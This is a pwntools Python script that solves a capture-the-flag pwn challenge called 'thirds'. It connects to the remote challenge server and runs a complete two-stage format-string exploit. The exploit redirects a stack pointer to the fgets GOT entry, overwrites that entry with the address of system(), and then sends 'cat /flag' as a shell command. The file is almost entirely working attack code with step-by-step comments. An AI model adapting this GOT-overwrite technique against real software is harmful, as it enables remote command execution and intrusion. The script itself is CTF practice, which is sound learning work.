#!/usr/bin/env python3

from pwn import *
import os
import re


# ============================================================
# LOCAL FILES
# ============================================================

BASE_DIR = "/home/kali/Downloads/gaslight_thirds/handout"

BINARY = os.path.join(BASE_DIR, "thirds")
LIBC_PATH = os.path.join(BASE_DIR, "libc.so.6")
LD_PATH = os.path.join(BASE_DIR, "ld-linux-x86-64.so.2")


# ============================================================
# REMOTE
# ============================================================

HOST = "86d95630-56bc-469a-8426-31a50709feda.play.gaslightctf.cooking"
PORT = 31337


# ============================================================
# CONSTANTS
# ============================================================

# From:
#
# readelf -r ./thirds
#
FGETS_GOT = 0x4010

# During printf #1:
#
# %34$p == address of stack slot containing argument #25
#
ARG25_SLOT_POS = 34

# argument #25 itself
ARG25_POS = 25


# ============================================================
# PWNLIB
# ============================================================

context.binary = BINARY
context.arch = "amd64"

context.log_level = "info"
context.timeout = 5


elf = ELF(
    BINARY,
    checksec=False
)

libc = ELF(
    LIBC_PATH,
    checksec=False
)


SYSTEM_OFFSET = libc.symbols["system"]

SYSTEM_LOW16 = SYSTEM_OFFSET & 0xffff


log.info(f"BINARY = {BINARY}")
log.info(f"LIBC   = {LIBC_PATH}")
log.info(f"LD     = {LD_PATH}")

log.info(
    f"system offset = {SYSTEM_OFFSET:#x}"
)

log.info(
    f"system low16 = {SYSTEM_LOW16:#06x}"
)

log.info(
    f"fgets GOT offset = {FGETS_GOT:#06x}"
)


# ============================================================
# CONNECT
# ============================================================

def connect():

    log.info(
        f"Connecting to {HOST}:{PORT}"
    )

    io = process(
        [
            "ncat",
            "--ssl",
            HOST,
            str(PORT),
        ],
        stdin=PTY,
        stdout=PTY,
        stderr=PIPE,
    )

    io.recvuntil(
        b"1> ",
        timeout=5
    )

    log.success("Connected")

    return io


io = connect()


# ============================================================
# STAGE 1
#
# Initial:
#
#     argument #25
#         =
#     PIE + 0x3db8
#
# argument #34 points to the stack slot containing argument #25.
#
# We modify only the low 16 bits:
#
#     0x3db8 -> 0x4010
#
# Therefore:
#
#     argument #25 = PIE + 0x4010
#                   = fgets@GOT
#
# Payload:
#
#     %1$16400c%34$hn
#
# EXACTLY 15 bytes.
#
# No newline!
# ============================================================

payload1 = (
    b"%1$16400c"
    b"%34$hn"
)

assert len(payload1) == 15

log.info(
    f"stage1 payload = {payload1!r}"
)

log.info(
    f"stage1 length = {len(payload1)}"
)


# IMPORTANT:
# 15 bytes exactly, therefore DON'T sendline().
io.send(
    payload1
)


# The first printf produces 16400 spaces.
# Then the program prints:
#
#     printf("2> ");
#
response1 = io.recvuntil(
    b"2> ",
    timeout=5
)

log.info(
    f"stage1 response length = "
    f"{len(response1)}"
)


# ============================================================
# STAGE 2
#
# Now:
#
#     argument #25 = fgets@GOT
#
# So:
#
#     %25$hn
#
# writes directly into fgets@GOT.
#
# We replace:
#
#     fgets
#
# with:
#
#     system
#
# Both addresses are inside the same libc mapping, so changing
# only the low 16 bits is sufficient.
#
# system low16 = 0x8860 = 34912
#
# Payload:
#
#     %1$34912c%25$hn
#
# EXACTLY 15 bytes.
#
# Again, NO newline!
# ============================================================

payload2 = (
    f"%1${SYSTEM_LOW16}c"
    f"%{ARG25_POS}$hn"
).encode()


assert len(payload2) == 15

log.info(
    f"stage2 payload = {payload2!r}"
)

log.info(
    f"stage2 length = {len(payload2)}"
)


io.send(
    payload2
)


# ============================================================
# IMPORTANT
#
# After stage 2, the next call in main is:
#
#     printf("3> ");
#
# printf itself has NOT been overwritten.
#
# Therefore the normal "3> " prompt should still appear.
#
# But after that the program calls:
#
#     fgets(buf3, 16, stdin)
#
# and fgets@GOT now points to system().
#
# ============================================================

response2 = io.recvuntil(
    b"3> ",
    timeout=5
)

log.info(
    f"stage2 response length = "
    f"{len(response2)}"
)


# ============================================================
# STAGE 3
#
# Original:
#
#     fgets(buf3, 16, stdin)
#
# After overwrite:
#
#     system(buf3)
#
# So the third input becomes the command.
#
# ============================================================

command = b"cat /flag"

assert len(command) < 15

log.info(
    f"stage3 command = {command!r}"
)

io.sendline(
    command
)


log.success(
    "All three stages sent."
)


# ============================================================
# RECEIVE
# ============================================================

try:

    result = io.recvall(
        timeout=5
    )

except Exception as e:

    log.warning(
        f"Receive error: {e}"
    )

    result = b""


print()
print("=" * 70)

print(
    result.decode(
        "utf-8",
        errors="replace"
    )
)

print("=" * 70)


# ============================================================
# FLAG
# ============================================================

flag = re.search(
    rb"gaslightCTF\{[^}\r\n]+\}",
    result,
    re.IGNORECASE
)

if flag:

    log.success(
        f"FLAG = {flag.group(0).decode()}"
    )

else:

    log.warning(
        "gaslightCTF{...} not found."
    )


io.close()